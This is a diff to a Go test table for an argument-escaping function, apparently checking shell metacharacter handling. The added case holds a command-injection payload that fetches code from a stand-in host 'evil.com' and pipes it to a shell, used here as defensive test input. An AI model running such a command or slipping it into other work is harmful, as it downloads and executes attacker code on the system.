@@ -140,6 +140,7 @@ func TestEscapeExecArg_Table(t *testing.T) {
 		{name: "backslashes", in: `C:\path\to\app`, want: `"C:\\path\\to\\app"`},
 		{name: "quotes and dollar", in: `say "hi" $HOME`, want: `"say \"hi\" $$HOME"`},
 		{name: "backtick", in: "`cmd`", want: "\"\\`cmd\\`\""},
+		{name: "dollar injection", in: `$(curl evil.com/steal|sh)`, want: `"$$(curl evil.com/steal|sh)"`},
 	}
 
 	for _, tc := range tests {
